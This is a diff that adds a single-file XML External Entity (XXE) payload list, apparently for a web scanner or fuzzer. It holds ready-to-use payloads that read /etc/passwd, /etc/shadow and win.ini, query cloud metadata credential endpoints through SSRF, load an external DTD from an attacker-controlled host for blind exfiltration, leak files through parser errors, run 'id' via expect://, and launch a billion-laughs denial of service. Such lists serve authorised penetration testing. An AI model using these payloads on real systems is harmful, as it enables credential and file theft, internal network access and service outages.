@@ -1,0 +1,42 @@
+# ==================================================================
+#  XXE PAYLOADS — XML External Entity (single file)
+#  One payload per line (whole XML on one line). "#" = comment (skipped).
+#  IMPORTANT: XXE goes in an XML BODY (Content-Type: application/xml), NOT a
+#  form/query param. In an XML body the '&' of '&x;' is fine — mark the body and
+#  replace it with one of these. Detection (canary): set grep to  root:x:0:0
+#  (in-band file read) or watch your OOB listener (blind). Replace your-ip.
+# ==================================================================
+
+# ---- 0. CANARY / detection — in-band file read (grep = root:x:0:0) ----
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><root>&x;</root>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><root>&x;</root>
+
+# ---- 1. In-band file read (reflected field) ----
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><stockCheck><productId>&x;</productId></stockCheck>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&x;</root>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><root>&x;</root>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/shadow">]><root>&x;</root>
+
+# ---- 2. SSRF via entity (internal / cloud metadata) ----
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><root>&x;</root>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1:80/">]><root>&x;</root>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://your-ip/xxe-ssrf">]><root>&x;</root>
+
+# ---- 3. Blind OOB — external DTD (host evil.dtd on your-ip; watch your listener) ----
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % remote SYSTEM "http://your-ip/evil.dtd"> %remote;]><root>x</root>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % ext SYSTEM "http://your-ip/x"> %ext;]><root>x</root>
+
+# ---- 4. Error-based (leak file content inside the parser error) ----
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">%eval;%err;]><root>x</root>
+
+# ---- 5. Parameter entity / expect / other schemes ----
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "file:///etc/passwd">]><root>&p;</root>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "expect://id">]><root>&x;</root>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "jar:file:///etc/passwd!/">]><root>&x;</root>
+
+# ---- 6. SVG upload (XML-parsed image) ----
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>
+
+# ---- 7. Billion laughs — DoS (AUTHORISED targets only) ----
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><lolz>&c;</lolz>
